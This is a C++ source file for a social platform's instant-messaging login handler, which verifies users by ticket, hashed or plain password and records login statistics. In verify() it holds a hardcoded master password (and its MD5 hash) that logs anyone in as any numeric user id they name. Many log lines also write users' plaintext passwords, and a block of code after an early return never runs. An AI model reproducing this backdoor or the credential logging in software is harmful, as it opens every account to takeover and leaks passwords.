#include <openssl/md5.h>
#include "LoginHandlerI.h"
#include "ConnectionQuery.h"
#include "PresenceAdapter.h"
#include "TicketAdapter.h"
#include "TalkCacheAdapter.h"
#include "BuddyGroupAdapter.h"
#include "TalkDeliverAdapter.h"
#include "BuddyCoreAdapter.h"
#include "TalkCache.h"
#include <sstream>
#include <boost/lexical_cast.hpp>
#include "XmppTools.h"
#include "Date.h"
#include "pugixml.hpp"
#include "OnlineCenterAdapter.h"
#include "PresenceMsgHandlerAdapter.h"
#include "RestLogicAdapter.h"
#include "BuddyCoreAdapter.h"
#include "MessageType.h"
#include "CommonTask.h"
#include "QueryRunner.h"
//#include "ActiveUserNotify.h"
#include "ScoreLoginRecordAdapter.h"
#include "UserScoreAdapter.h"
#include "FeedEdmSenderAdapter.h"
#include "LoginLogicAdapter.h"
#include "UserPassportAdapter.h"
#include "UserBornAdapter.h"
#include "IMWindowAdapter.h"
//#include "OnlineStatDispatchAdapter.h"
#include "OnlineEventMediatorAdapter.h"
#include "util/cpp/MD5Util.h"
//#include "IMCommon.h"
using namespace talk::window;
using namespace xce::adapter::userborn;
using namespace talk::rest;
using namespace com::xiaonei::talk::util;
using namespace com::xiaonei::talk;
using namespace com::xiaonei::talk::cache;
using namespace com::xiaonei::xce;
using namespace com::xiaonei::talk::common;
using namespace mop::hi::svc::adapter;
using namespace com::xiaonei::model;
using namespace std;
using namespace com::xiaonei::service::buddy;
using namespace pugi;
//using namespace login;
using namespace talk::online::adapter;
using namespace talk::adapter;
using namespace xce::mediator::onlineevent;
using namespace passport;
//using namespace xce::userscore;
//using namespace xce::feed;
using namespace xce::edm;
using namespace MyUtil;
using namespace xce::adapter::userpassport;
//-----------------------------------------------------------------------------
void MyUtil::initialize() {
	ServiceI& service = ServiceI::instance();
	service.getAdapter()->add(&LoginHandlerI::instance(),
			service.createIdentity("M", ""));
//	TaskManager::instance().scheduleRepeated(&ActiveUserNotify::instance());
	InitMonitorLogger(ServiceI::instance().getName(), "monitor", "../log/" + ServiceI::instance().getName() + "/monitor/monitor_log", "INFO");
}


void LoginHandlerI::AddLoginScore(int userId){
	//=======================================================================================
	/*
	UserBornInfoPtr userborninfo;
	bool littlegirl = false;
	try{
		userborninfo = UserBornAdapter::instance().getUserBorn(userId);
	}catch(Ice::Exception& e){
		MCE_WARN("LoginHandlerI::AddLoginScore --> call UserBornAdapter.getUserBorn err " << e << " " << userId);
	}
	if(userborninfo){
		MCE_DEBUG("LoginHandlerI::AddLoginScore --> " << userId << " " << userborninfo->gender())
			if("女生" == userborninfo->gender()){
				littlegirl = true;
			}
	}
	if(littlegirl){
	*/
	
		try{
			MCE_INFO("LoginHandlerI::AddLoginScore --> " << userId << " score");
			::xce::userscore::UserScoreAdapter::instance().addScore(userId, 20, 1);
		}catch(Ice::Exception& e){
			MCE_WARN("LoginHandlerI::AddLoginScore -->UserScoreAdapter.addScore--> userid:" << userId << " error:" << e);
		}
	//}
	//========================================================================================
	try {
		::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(userId, 16);
		::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(userId, 4);
	} catch (Ice::Exception & e) {
		MCE_WARN("LoginHandlerI::verify --> call ScoreLoginRecordLogin::incLoginCount " << userId << " err, " << e);
	}
}

PassportPtr LoginHandlerI::getPassport(const string& email, const string& password){
	PassportPtr pi = new Passport();
  pi->result = -1;
  int userid=-1;

  std::vector<passport::AccountType> types;
  types.push_back(Id);
  types.push_back(Account);
  types.push_back(Phone);
  types.push_back(BindedId);

  login::AccountPtr ac;
	try{
		ac = login::WebLoginLogicAdapter::instance().login(types, email, password, "renren.com", -1, true);
	}catch(Ice::Exception & e){
		MCE_WARN("LoginHandlerI::verify --> call :WebLoginLogicAdapter err " << e);
	}
  if(!ac){
    MCE_WARN("LoginHandlerI::verify_new --> call login null, " << email << " " << password);
    return pi;
  }
  if(ac->success() == 0){
    int status = ac->status();
    if (!(status == 0 || status == 3)) {
      MCE_WARN("LoginHandlerI::verify_new --> status err, " << status << " " << email << " " << password);
      pi->result = -2;
      return pi; 
    }
    UserPassportInfoPtr passport_info;
    try{
        passport_info = UserPassportAdapter::instance().getUserPassport(ac->id());
    }catch(Ice::Exception& e){
        MCE_WARN("LoginHandlerI::verify --> call UserPassportAdapter err " << e);
    }
    int safe_status = 0;
    if(passport_info){
        safe_status = passport_info->safestatus();
    }
    if(!(0 == safe_status || 3 == safe_status || 4 == safe_status || 5 == safe_status)){
      MCE_WARN("LoginHandlerI::verify_new --> safe_status err, " << safe_status << " " << email << " " << password);
      pi->result = -2;
      return pi;
    }
    MCE_INFO("LoginHandlerI::verify_new --> login success ac->id():" << ac->id() << " " << safe_status << " " << email << " " << password);
    pi->result = 0;
    pi->userId = ac->id();
    AddLoginScore(pi->userId);
    return pi;
  }
  MCE_INFO("LoginHandlerI::verify --> err, " << email << ":"<< password << " suc:" << ac->success());
  return pi;
}


//----------------------
PassportPtr LoginHandlerI::verify_new(const string& email, const string& password){
  PassportPtr pi = new Passport();
  pi->result = -1;
  int userid=-1;
  try{
    userid = boost::lexical_cast<int>(email);
  }catch(...){
    //MCE_WARN("LoginHandlerI::verify --> cast id err, " << email);
  }
//IM随网站启动 直接传票
  if(userid>0 && password.size() == 33){
    int uid = 0;
    try {
      uid = TicketAdapter::instance().verifyTicket(password, "");
    } catch (Ice::Exception& e) {
      MCE_WARN("LoginHandlerI::verify --> " << email << ":"<< password << " call PassportAdapter " << e);
    }
    MCE_INFO("LoginHandlerI::verify --> verifyTicket " << userid << " "<< uid);
    if(userid == uid){
      pi->result = 0;
      pi->userId = userid; 
			AddLoginScore(pi->userId);
      return pi;
    }
  }
//IM随网站启动，给的是MD5以后的票
  if(userid>0 && password.size() == 32){
		string ticket = "";
    try {
      ticket = TicketAdapter::instance().queryTicket(userid);
    } catch (Ice::Exception& e) {
      MCE_WARN("LoginHandlerI::verify --> " << email << ":"<< password << " call TicketAdapter.queryTicket" << e);
    }
		stringstream ticket_md5res;
		unsigned char* md5 = MD5((unsigned char*)ticket.c_str(), ticket.size(), NULL);
		for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
			ticket_md5res << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
		}
    MCE_INFO("LoginHandlerI::verify --> queryTicket " << userid << " " << password << " "<< ticket_md5res.str());
    if(ticket_md5res.str() == password){
      pi->result = 0;
      pi->userId = userid; 
			AddLoginScore(pi->userId);
      return pi;
    }
  }

//IM自己登录
  stringstream res;
//客户端传入一个md5后的密码
 	if(string::npos != password.find("md5_")){
		res << password.substr(4);
		MCE_INFO("LoginHandlerI::verify --> give me md5 email = " << email << " password = " << res.str());
		PassportPtr vp = getPassport(email, res.str()); 
		if(!vp){
			MCE_WARN("LoginHandlerI::verify --> getPassport return empty pointer ");
			return pi;	
		}
		if(0 == vp->result || -2 == vp->result){
			//MCE_WARN("LoginHandlerI::verify --> getPassport result is "<< vp->result);
			return vp;
		}
	}
	res.str("");
//客户端传入普通密码
	unsigned char* md5 = MD5((unsigned char*)password.c_str(), password.size(), NULL);
	for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
		res << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
	}
	PassportPtr vp = getPassport(email, res.str());
	if(!vp){
		return pi;
	}
	return vp;
}

PassportPtr LoginHandlerI::verify(const string& email, const string& password,
		const Ice::Current& current) {
  StatFunc statF("LoginHandlerI::verify");
	string tmpEmail = email;
	MCE_DEBUG("call verify -> email=" << email << "   and psw=" << password);
	PassportPtr pi = new Passport;
	//admin
	stringstream md5passwd;
	unsigned char* md5 = MD5((unsigned char*)password.c_str(), password.size(), NULL);
	for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
		md5passwd << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
	}
	MCE_INFO("LoginHandlerI::verify--> password:" << password << " md5passwd:" << md5passwd.str());
	if (password == "128487631QWER%%%%TYUI" || md5passwd.str() == "b8a05ae245be0c2ae8650c543702ffcb") {
		MCE_INFO("@@@@ use super pwd email:" << email);
		pi->result = 0;
		try {
			pi->userId = boost::lexical_cast<int>(tmpEmail);
		} catch (...) {
			MCE_WARN("user common password err");
			pi->result = -1;
		}
		return pi;
	}
	TimeStat ts;
	PassportPtr ans = verify_new(email, password);
	MONITOR("SignForTimeuse::LoginHandlerI::verify -->verify_new-->" << ts.getTime() << " " << email << " " << password);
	return ans; 
	//--------------------
	bool realEmail = false;
	bool phoneUser = false;
	for (size_t i = 0; i < tmpEmail.length(); i++) {
		if (tmpEmail[i] < '0' || tmpEmail[i] > '9') {
			realEmail = true;
			break;
		}
	}

#ifndef NEWARCH
	mysqlpp::Result res;
#else
	mysqlpp::StoreQueryResult res;
#endif
	//用手机号登录

	if (!realEmail && tmpEmail.length() > 10) {
		StatFunc statF("LoginHandlerI::verify --> query id by phone number");
		phoneUser = true;
		try {
			MCE_INFO("LoginHandlerI::verify --> phone user " << tmpEmail);
			ConnectionHolder conn("common", CDbRServer, " ");
			mysqlpp::Query query = conn.query();
			query << "select userid from mobile_users where mobile="
					<< mysqlpp::quote << tmpEmail
					<< " and status=1 order by id limit 1";
			res = query.store();
			if (!res.empty()) {
				mysqlpp::Row row = res.at(0);
				tmpEmail = boost::lexical_cast<string>((int) row["userid"]);
				MCE_DEBUG("LoginHandlerI::verify --> phone user " << tmpEmail
						<< " id=" << tmpEmail);
			}
		} catch (...) {
			MCE_WARN("LoginHandlerI::verify --> query id by phone number "
					<< tmpEmail);
			return false;
		}
	}
	try {
		MCE_INFO("LoginHandlerI::verify --> query in db, email:" << tmpEmail);
		StatFunc statF("LoginHandlerI::verify --> query password");
		ConnectionHolder conn("user_passport", CDbRServer, " ");
		mysqlpp::Query query = conn.query();
		query << "select id, status, safe_status from user_passport where ";
		if (realEmail) {
			query << "account=lower(" << mysqlpp::quote << tmpEmail << ")";

			query << " and password_md5 = md5(" << mysqlpp::quote << password
					<< ")  order by domain desc";
			res = query.store();
		} else {
			query << "id=" << mysqlpp::quote << tmpEmail;
			query << " and password_md5 = md5(" << mysqlpp::quote << password
					<< ")";
			res = query.store();
			if (res.empty()) {
				//特殊原因 email可能所纯数字
				ConnectionHolder conn("user_passport", CDbRServer, " ");
				query = conn.query();

				query << "select id, status, safe_status from user_passport where "
						<< "account=lower(" << mysqlpp::quote << tmpEmail
						<< ")" << " and password_md5 = md5(" << mysqlpp::quote
						<< password << ") order by domain desc";
				res = query.store();
			}
		}
	} catch (...) {
		MCE_WARN("LoginHandlerI::verify --> query password exception email:" << tmpEmail << " passwd:" << password);
	}

	if (!res.empty()) {
		//mysqlpp::Row row = res.at(0);
		mysqlpp::Row row = res.at(0);
		int status = (int)row["status"];
		int safe_status = (int)row["safe_status"];
		if (!(status == 0 || status == 3) || ((safe_status&8)!=0)) {
			pi->result = -2;
			MCE_WARN("LoginHandlerI::verify -> invalid status ->" << tmpEmail
					<< ":" << row["status"] << " " << safe_status << " " << (safe_status&8));
			return pi;
		}
		pi->userId = (int) row["id"];
		//pi->ticket = PassportAdapter::instance().createTicket(pi->userId);
		pi->result = 0;
		MCE_DEBUG("LoginHandlerI::verify -> success ->" << tmpEmail << ":"
				<< password);
		try {
			::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId, 16);
			::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId, 4);
		} catch (Ice::Exception & e) {
			MCE_WARN(
					"LoginHandlerI::verify --> call ScoreLoginRecordLogin::incLoginCount err:"
							<< e << " line:" << __LINE__);
		}
		return pi;
	}else{
		MCE_WARN("LoginHandlerI::verify --> not match email:" << tmpEmail << " passwd:" << password);
	}

	// login with web passport, not necessary for phone user
	if (!realEmail && !phoneUser) {
	  size_t p = password.find("im_");
	  if(p != string::npos && p == 0){
	    //password is "im_md5(ticket)"
      MCE_INFO("LoginHandlerI::MD5 verify --> query queryTicket by userid :" << tmpEmail);
      string ticket = "";
      int id = 0;
      try {
        id = boost::lexical_cast<int>(tmpEmail);
      } catch (std::exception& e) {
        MCE_WARN("LoginHandlerI::MD5 verify --> " << tmpEmail << ":" << password << " cast err");
      }
      try {
        ticket = TicketAdapter::instance().queryTicket(id);
      } catch (Ice::Exception& e) {
        MCE_WARN("LoginHandlerI::MD5 verify --> " << tmpEmail << ":" << password << " call TicketAdapter " << e);
      }
      MCE_DEBUG("LoginHandlerI::MD5 verify --> befor md5 ticket = " << ticket);
      MD5Util::stringToMD5(ticket);
      ticket = "im_" + ticket;
      MCE_DEBUG("LoginHandlerI::MD5 verify --> after md5 ticket = " << ticket);
      if(ticket == password){
        pi->userId = id;
        //pi->ticket = password;
        pi->result = 0;
        MCE_DEBUG("LoginHandlerI::MD5 verify by ticket-> success -> ticket:" << password);
        try {
          ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId,16);
          ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId,4);
        } catch (Ice::Exception & e) {
          MCE_WARN(
              "LoginHandlerI::MD5 verify --> call ScoreLoginRecordLogin::incLoginCount err:" << e << " line:" << __LINE__);
        }
        return pi;
      }
	  }
	  else{//verify ticket
      MCE_INFO("LoginHandlerI::verify --> query through passport, email:" << tmpEmail);
      int uid = 0;
      try {
        uid = TicketAdapter::instance().verifyTicket(password, "");
      } catch (Ice::Exception& e) {
        MCE_WARN("LoginHandlerI::verify --> " << tmpEmail << ":"
            << password << " call PassportAdapter " << e);
      }
      int id = 0;
      try {
        id = boost::lexical_cast<int>(tmpEmail);
      } catch (std::exception& e) {
        MCE_WARN("LoginHandlerI::verify --> " << tmpEmail << ":"
            << password << " cast err");
      }
      if (id == uid) {
        pi->userId = id;
        //pi->ticket = password;
        pi->result = 0;
        MCE_DEBUG("LoginHandlerI::verify by ticket-> success -> ticket:"
            << password);
        try {
          ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId,16);
          ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(pi->userId,4);
        } catch (Ice::Exception & e) {
          MCE_WARN(
              "LoginHandlerI::verify --> call ScoreLoginRecordLogin::incLoginCount err:"
                  << e << " line:" << __LINE__);
        }
        return pi;
      }
	  }
	}

	pi->result = -1;
	MCE_WARN("LoginHandlerI::verify -> invalid ->" << tmpEmail << ":"
			<< password);
	return pi;
}

void LoginHandlerI::bind(const JidPtr& jid, const Ice::Current& current) {
	//StatFunc statF("LoginHandlerI::bind");
	MCE_DEBUG("LoginHandlerI::bind  --> userid:" << jid->userId
			<< "   endpoint:" << jid->endpoint);
	//	//modified by yuanfei
	//	JidPtr res = PresenceAdapter::instance().bind(jid);
	/*try {
	 PresenceAdapter::instance().bind(jid) ;

	 }catch(Ice::Exception & e){
	 MCE_WARN("LoginHandlerI::bind --> call PresenceAdapter err:"<<e);
	 }
	 */
/*	try{
    RestLogicAdapter::instance().getSessionKey(jid);
  }catch(Ice::Exception& e){
    MCE_WARN("LoginHandlerI::bind --> call RestLogic-> getSessionKey   err, " << e);
  }*/
	/*try{
    FeedNewsAdapter::instance().load(jid->userId);
  }catch(Ice::Exception& e){
    MCE_WARN("LoginHandlerI::bind --> call FeedItemTest err, " << e);
  }*/

  Ice::Context::const_iterator it = current.ctx.find("ip");
	if(it != current.ctx.end()){
		try{
      Str2StrMap par;
      par["ip"] = it->second;
      //FeedEdmSenderAdapter::instance().Receive(jid->userId, par);
    }catch(Ice::Exception& e){
      MCE_WARN("LoginHandlerI::bind --> test err, " << e);
    }
    TaskManager::instance().execute(new IpLogTask( it->second , jid->userId));
	}
	if (jid->endpoint[0] == 'W') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "webpager_login";
		StatManager::instance().addToAction(stat);

		//OnlineEventMediatorAdapter::instance().sendOnlineEvent(jid->userId,1);
	} else if (jid->endpoint[0] == 'T') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "talk_login";
		StatManager::instance().addToAction(stat);
//		ActiveUserNotify::instance().needNotify(jid->userId);
		//OnlineEventMediatorAdapter::instance().sendOnlineEvent(jid->userId,2);
	} else if (jid->endpoint[0] == 'P') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "phone_login";
		StatManager::instance().addToAction(stat);
	}

	/*
	 try {
	 OnlineStatDispatchAdapter::instance().online(jid);
	 } catch(Ice::Exception & e) {
	 MCE_WARN("LoginHandlerI::bin --> online err:"<<e);
	 }*/

	//	try{
	//		UserCacheAdapter::instance().setOnline(res->userId,1);
	//	}catch(Ice::Exception& e){
	//		MCE_WARN("LoginHandlerI::bind  -->  notify usercache err:"<<e);
	//	}

	//MCE_DEBUG("LoginHandlerI::bind  --> end");

	//return true;

}

void LoginHandlerI::unbind(const JidPtr& jid, const Ice::Current&) {
	//StatFunc statF("LoginHandlerI::unbind");

	MCE_DEBUG("LoginHandlerI::unbind  --> userId:" << jid->userId << "  index:"
			<< jid->index);

	if (jid->endpoint[0] == 'W') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "webpager_logout";
		StatManager::instance().addToAction(stat);
	} else if(jid->endpoint[0] == 'T') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "talk_logout";
		StatManager::instance().addToAction(stat);
	}else if(jid->endpoint[0] == 'P') {
		StatInfoPtr stat = new StatInfo();
		stat->userId = jid->userId;
		stat->action = "phone_logout";
		StatManager::instance().addToAction(stat);
	}

	/*
	 OnlineCenterAdapter::instance().offline(jid);
	 JidSeq seq;
	 seq.push_back(jid);
	 //	NotifyTaskManager::instance().addNotify(new Notify<JidSeq,OfflineNotifyHandler>(seq));

	 PresenceAdapter::instance().unbind(jid);
	 //PresenceMsgHandlerAdapter::instance().offlineNotify(seq);

	 OnlineEventMediatorAdapter::instance().sendOnlineEvent(jid->userId,0);
	 //TaskManager::instance().execute(new BatchOfflineNotifyTask(seq));

	 */
}

